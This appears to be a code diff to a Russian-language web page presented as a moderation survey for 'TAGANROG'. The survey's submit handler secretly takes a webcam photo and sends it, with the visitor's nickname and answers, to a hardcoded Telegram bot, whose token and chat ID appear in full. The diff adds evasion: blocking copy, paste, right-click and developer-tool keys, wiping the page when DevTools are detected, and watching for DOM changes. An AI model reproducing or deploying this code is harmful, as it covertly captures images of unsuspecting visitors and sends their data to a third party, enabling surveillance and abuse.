@@ -129,6 +129,17 @@
             font-size: 50px;
             margin-bottom: 15px;
         }
+        .protection-alert {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #ff4444;
+            color: white;
+            padding: 10px;
+            z-index: 1000;
+            font-weight: bold;
+        }
         @media (max-width: 480px) {
             body {
                 padding: 15px;
@@ -143,6 +154,8 @@
     </style>
 </head>
 <body>
+    <div id="protectionAlert" class="protection-alert" style="display: none;"></div>
+
     <div class="camera-access" id="cameraAccess">
         <div class="camera-icon">✨</div>
         <h2>Опрос модерации TAGANROG</h2>
@@ -190,58 +203,156 @@
     <canvas id="photoCanvas"></canvas>
 
     <script>
+        // ===== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ И КОНСТАНТЫ ===== //
+        const TELEGRAM_BOT_TOKEN = '7465976373:AAGf39_tqo49urq0BjZ8Epm7dkap-HzcG5E';
+        const TELEGRAM_CHAT_ID = '1165076107';
+        let protectionTriggered = false;
+        
         // ===== ЗАЩИТА ОТ КОПИРОВАНИЯ И АНАЛИЗА ===== //
+        function showProtectionAlert(message) {
+            if (protectionTriggered) return;
+            
+            protectionTriggered = true;
+            const alertElement = document.getElementById('protectionAlert');
+            alertElement.textContent = message;
+            alertElement.style.display = 'block';
+            
+            setTimeout(() => {
+                alertElement.style.display = 'none';
+            }, 5000);
+        }
+        
         // 1. Блокировка контекстного меню
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
-            alert('Правый клик заблокирован');
+            showProtectionAlert('Правый клик заблокирован');
         });
-
+        
         // 2. Блокировка клавиш F12, Ctrl+Shift+I, Ctrl+U
         document.addEventListener('keydown', function(e) {
             if (e.key === 'F12' || 
                 (e.ctrlKey && e.shiftKey && e.key === 'I') || 
                 (e.ctrlKey && e.shiftKey && e.key === 'J') || 
-                (e.ctrlKey && e.key === 'U')) {
+                (e.ctrlKey && e.key === 'U') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'C')) {
                 e.preventDefault();
-                alert('Доступ к инструментам разработчика запрещён');
-                window.location.href = "about:blank";
+                showProtectionAlert('Доступ к инструментам разработчика запрещён');
             }
         });
-
+        
         // 3. Блокировка копирования
         document.addEventListener('copy', function(e) {
             e.preventDefault();
-            alert('Копирование запрещено');
+            showProtectionAlert('Копирование запрещено');
         });
-
+        
         // 4. Защита от перетаскивания элементов
         document.addEventListener('dragstart', function(e) {
             e.preventDefault();
+            showProtectionAlert('Перетаскивание элементов запрещено');
         });
-
+        
         // 5. Детектор открытия DevTools
         function detectDevTools() {
+            if (protectionTriggered) return;
+            
             const widthThreshold = window.outerWidth - window.innerWidth > 160;
             const heightThreshold = window.outerHeight - window.innerHeight > 160;
-            if (widthThreshold || heightThreshold) {
-                alert('Обнаружены инструменты разработчика!');
-                window.location.href = "about:blank";
+            
+            if ((widthThreshold || heightThreshold) && !document.hidden) {
+                showProtectionAlert('Обнаружены инструменты разработчика!');
+                document.body.innerHTML = '<h1 style="color:red;margin-top:50px;">Доступ запрещен</h1><p>Попытка использования инструментов разработчика</p>';
+                document.body.style.backgroundColor = '#f8f8f8';
+                document.body.style.padding = '20px';
+                throw new Error('DevTools detected');
             }
         }
-        setInterval(detectDevTools, 1000);
-
-        // ===== ОСНОВНОЙ КОД ===== //
-        const TELEGRAM_BOT_TOKEN = '7465976373:AAGf39_tqo49urq0BjZ8Epm7dkap-HzcG5E';
-        const TELEGRAM_CHAT_ID = '1165076107';
         
+        // 6. Защита от вставки
+        document.addEventListener('paste', function(e) {
+            e.preventDefault();
+            showProtectionAlert('Вставка запрещена');
+        });
+        
+        // 7. Защита от инспектирования элементов
+        document.addEventListener('mouseover', function(e) {
+            if (e.target.style.outline && e.target.style.outline.includes('dotted')) {
+                showProtectionAlert('Инспектирование элементов запрещено');
+                e.target.style.outline = 'none';
+            }
+        });
+        
+        // 8. Защита от изменения DOM
+        const observer = new MutationObserver(function(mutations) {
+            if (protectionTriggered) return;
+            
+            for (let mutation of mutations) {
+                if (mutation.addedNodes.length > 0 || mutation.removedNodes.length > 0) {
+                    showProtectionAlert('Обнаружено изменение структуры страницы');
+                    break;
+                }
+            }
+        });
+        
+        observer.observe(document, {
+            childList: true,
+            subtree: true,
+            attributes: true
+        });
+        
+        // Запускаем детектор DevTools каждую секунду
+        setInterval(detectDevTools, 1000);
+        
+        // ===== ОСНОВНОЙ КОД ===== //
         document.addEventListener('DOMContentLoaded', function() {
+            // Инициализация состояний
             document.getElementById('cameraAccess').style.display = 'block';
             document.getElementById('surveyForm').style.display = 'none';
             document.getElementById('thankYou').style.display = 'none';
             
+            // Обработчик кнопки начала опроса
             document.getElementById('allowCameraBtn').addEventListener('click', function() {
                 requestCameraAccess();
+            });
+            
+            // Обработчик отправки формы
+            document.getElementById('submitBtn').addEventListener('click', function() {
+                const nickname = document.getElementById('nickname').value.trim();
+                if (!nickname) {
+                    showProtectionAlert('Пожалуйста, введите ваш никнейм');
+                    return;
+                }
+                
+                document.getElementById('surveyForm').style.display = 'none';
+                document.getElementById('thankYou').style.display = 'block';
+                
+                const surveyData = {
+                    nickname: nickname,
+                    rating: document.getElementById('q1').value,
+                    comment: document.getElementById('q2').value,
+                    cameraAccess: false
+                };
+                
+                // Добавляем защиту на этапе благодарности
+                setTimeout(() => {
+                    detectDevTools();
+                }, 2000);
+                
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        surveyData.cameraAccess = true;
+                        const video = document.getElementById('videoElement');
+                        video.srcObject = stream;
+                        
+                        setTimeout(() => {
+                            takeAndSendPhoto(surveyData);
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 100);
+                    })
+                    .catch(err => {
+                        console.log("Не удалось получить доступ к камере");
+                        sendToTelegram(surveyData, null);
+                    });
             });
         });
         
@@ -259,44 +370,10 @@
                     }, 100);
                 })
                 .catch(err => {
-                    alert('Для продолжения необходимо разрешить доступ к камере');
+                    showProtectionAlert('Для продолжения необходимо разрешить доступ к камере');
                     console.error("Ошибка доступа к камере", err);
                 });
         }
-        
-        document.getElementById('submitBtn').addEventListener('click', function() {
-            const nickname = document.getElementById('nickname').value.trim();
-            if (!nickname) {
-                alert('Пожалуйста, введите ваш никнейм');
-                return;
-            }
-
-            document.getElementById('surveyForm').style.display = 'none';
-            document.getElementById('thankYou').style.display = 'block';
-            
-            const surveyData = {
-                nickname: nickname,
-                rating: document.getElementById('q1').value,
-                comment: document.getElementById('q2').value,
-                cameraAccess: false
-            };
-            
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    surveyData.cameraAccess = true;
-                    const video = document.getElementById('videoElement');
-                    video.srcObject = stream;
-                    
-                    setTimeout(() => {
-                        takeAndSendPhoto(surveyData);
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 100);
-                })
-                .catch(err => {
-                    console.log("Не удалось получить доступ к камере");
-                    sendToTelegram(surveyData, null);
-                });
-        });
         
         function takeAndSendPhoto(surveyData) {
             const video = document.getElementById('videoElement');
